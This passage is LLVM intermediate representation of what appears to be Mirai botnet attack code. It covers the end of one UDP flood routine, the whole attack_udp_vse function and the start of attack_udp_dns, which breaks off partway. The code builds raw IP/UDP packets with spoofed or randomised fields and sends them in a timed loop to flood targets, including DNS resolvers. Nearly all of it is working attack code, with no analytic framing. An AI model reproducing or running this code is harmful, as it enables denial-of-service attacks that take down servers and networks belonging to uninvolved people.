  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %20, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %300 = load i32, i32* %11, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %12, align 4
  %306 = load i8*, i8** %26, align 8
  %307 = load i16, i16* %20, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  br label %320

; <label>:320:                                    ; preds = %273
  %321 = load i32, i32* %11, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %11, align 4
  br label %180

; <label>:323:                                    ; preds = %180
  %324 = call i64 @time(i64* null) #6
  %325 = load i32, i32* %23, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %323
  br label %330

; <label>:329:                                    ; preds = %323
  br label %179

; <label>:330:                                    ; preds = %328, %89, %83
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %5
  br label %302

; <label>:67:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = bitcast i32* %11 to i8*
  %70 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* %69, i32 4) #6
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %12, align 4
  %74 = call i32 @close(i32 %73)
  br label %302

; <label>:75:                                     ; preds = %67
  store i32 0, i32* %11, align 4
  br label %76

; <label>:76:                                     ; preds = %168, %75
  %77 = load i32, i32* %11, align 4
  %78 = load i8, i8* %7, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %171

; <label>:81:                                     ; preds = %76
  %82 = call noalias i8* @calloc(i64 128, i64 1) #6
  %83 = load i8**, i8*** %13, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8*, i8** %83, i64 %85
  store i8* %82, i8** %86, align 8
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = bitcast i8* %91 to %struct.iphdr*
  store %struct.iphdr* %92, %struct.iphdr** %23, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i64 1
  %95 = bitcast %struct.iphdr* %94 to %struct.udphdr*
  store %struct.udphdr* %95, %struct.udphdr** %24, align 8
  %96 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %97 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %96, i64 1
  %98 = bitcast %struct.udphdr* %97 to i8*
  store i8* %98, i8** %25, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, 15
  %103 = or i8 %102, 64
  store i8 %103, i8* %100, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %105 = bitcast %struct.iphdr* %104 to i8*
  %106 = load i8, i8* %105, align 4
  %107 = and i8 %106, -16
  %108 = or i8 %107, 5
  store i8 %108, i8* %105, align 4
  %109 = load i8, i8* %14, align 1
  %110 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 1
  store i8 %109, i8* %111, align 1
  %112 = load i32, i32* %21, align 4
  %113 = sext i32 %112 to i64
  %114 = add i64 32, %113
  %115 = trunc i64 %114 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #7
  %117 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 2
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %15, align 2
  %120 = call zeroext i16 @htons(i16 zeroext %119) #7
  %121 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i32 0, i32 3
  store i16 %120, i16* %122, align 4
  %123 = load i8, i8* %16, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 5
  store i8 %123, i8* %125, align 4
  %126 = load i8, i8* %17, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %132

; <label>:128:                                    ; preds = %81
  %129 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %130 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 4
  store i16 %129, i16* %131, align 2
  br label %132

; <label>:132:                                    ; preds = %128, %81
  %133 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 6
  store i8 17, i8* %134, align 1
  %135 = load i32, i32* @LOCAL_ADDR, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 8
  store i32 %135, i32* %137, align 4
  %138 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %139 = load i32, i32* %11, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i64 %140
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i32 0, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 9
  store i32 %143, i32* %145, align 4
  %146 = load i16, i16* %18, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %19, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 1
  store i16 %151, i16* %153, align 2
  %154 = load i32, i32* %21, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 12, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i8*, i8** %25, align 8
  %162 = bitcast i8* %161 to i32*
  store i32 -1, i32* %162, align 4
  %163 = load i8*, i8** %25, align 8
  %164 = getelementptr inbounds i8, i8* %163, i64 4
  store i8* %164, i8** %25, align 8
  %165 = load i8*, i8** %25, align 8
  %166 = load i8*, i8** %20, align 8
  %167 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %165, i8* %166, i32 %167)
  br label %168

; <label>:168:                                    ; preds = %132
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %11, align 4
  br label %76

; <label>:171:                                    ; preds = %76
  br label %172

; <label>:172:                                    ; preds = %301, %171
  store i32 0, i32* %11, align 4
  br label %173

; <label>:173:                                    ; preds = %292, %172
  %174 = load i32, i32* %11, align 4
  %175 = load i8, i8* %7, align 1
  %176 = zext i8 %175 to i32
  %177 = icmp slt i32 %174, %176
  br i1 %177, label %178, label %295

; <label>:178:                                    ; preds = %173
  %179 = load i8**, i8*** %13, align 8
  %180 = load i32, i32* %11, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8*, i8** %179, i64 %181
  %183 = load i8*, i8** %182, align 8
  store i8* %183, i8** %26, align 8
  %184 = load i8*, i8** %26, align 8
  %185 = bitcast i8* %184 to %struct.iphdr*
  store %struct.iphdr* %185, %struct.iphdr** %27, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i64 1
  %188 = bitcast %struct.iphdr* %187 to %struct.udphdr*
  store %struct.udphdr* %188, %struct.udphdr** %28, align 8
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %218

; <label>:197:                                    ; preds = %178
  %198 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohl(i32 %203) #7
  %205 = call i32 @rand_next()
  %206 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %205, %212
  %214 = add i32 %204, %213
  %215 = call i32 @htonl(i32 %214) #7
  %216 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %197, %178
  %219 = load i16, i16* %15, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %227

; <label>:222:                                    ; preds = %218
  %223 = call i32 @rand_next()
  %224 = trunc i32 %223 to i16
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 3
  store i16 %224, i16* %226, align 4
  br label %227

; <label>:227:                                    ; preds = %222, %218
  %228 = load i16, i16* %18, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

; <label>:231:                                    ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  br label %236

; <label>:236:                                    ; preds = %231, %227
  %237 = load i16, i16* %19, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

; <label>:240:                                    ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  br label %245

; <label>:245:                                    ; preds = %240, %236
  %246 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = bitcast %struct.iphdr* %248 to i16*
  %250 = call zeroext i16 @checksum_generic(i16* %249, i32 20)
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 7
  store i16 %250, i16* %252, align 2
  %253 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 3
  store i16 0, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %257 = bitcast %struct.udphdr* %256 to i8*
  %258 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  %260 = load i16, i16* %259, align 2
  %261 = load i32, i32* %21, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 12, %262
  %264 = trunc i64 %263 to i32
  %265 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %255, i8* %257, i16 zeroext %260, i32 %264)
  %266 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 3
  store i16 %265, i16* %267, align 2
  %268 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i32 0, i32 1
  %270 = load i16, i16* %269, align 2
  %271 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %273
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 0
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %275, i32 0, i32 1
  store i16 %270, i16* %276, align 2
  %277 = load i32, i32* %12, align 4
  %278 = load i8*, i8** %26, align 8
  %279 = load i32, i32* %21, align 4
  %280 = sext i32 %279 to i64
  %281 = add i64 32, %280
  %282 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %283 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i32 0, i32 0
  %288 = bitcast %struct.sockaddr_in* %287 to %struct.sockaddr*
  store %struct.sockaddr* %288, %struct.sockaddr** %282, align 8
  %289 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %290 = load %struct.sockaddr*, %struct.sockaddr** %289, align 8
  %291 = call i64 @sendto(i32 %277, i8* %278, i64 %281, i32 16384, %struct.sockaddr* %290, i32 16)
  br label %292

; <label>:292:                                    ; preds = %245
  %293 = load i32, i32* %11, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %11, align 4
  br label %173

; <label>:295:                                    ; preds = %173
  %296 = call i64 @time(i64* null) #6
  %297 = load i32, i32* %22, align 4
  %298 = sext i32 %297 to i64
  %299 = icmp sgt i64 %296, %298
  br i1 %299, label %300, label %301

; <label>:300:                                    ; preds = %295
  br label %302

; <label>:301:                                    ; preds = %295
  br label %172

; <label>:302:                                    ; preds = %300, %72, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %5
  br label %414

; <label>:89:                                     ; preds = %5
  %90 = load i8*, i8** %22, align 8
  %91 = call i32 @util_strlen(i8* %90)
  store i32 %91, i32* %23, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %89
  br label %414

; <label>:95:                                     ; preds = %89
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %414

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

; <label>:104:                                    ; preds = %265, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %268

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %110 = call noalias i8* @calloc(i64 600, i64 1) #6
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %29, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %30, align 8
  %124 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %125 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %124, i64 1
  %126 = bitcast %struct.udphdr* %125 to %struct.dnshdr*
  store %struct.dnshdr* %126, %struct.dnshdr** %31, align 8
  %127 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %128 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %127, i64 1
  %129 = bitcast %struct.dnshdr* %128 to i8*
  store i8* %129, i8** %32, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %14, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i8, i8* %21, align 1
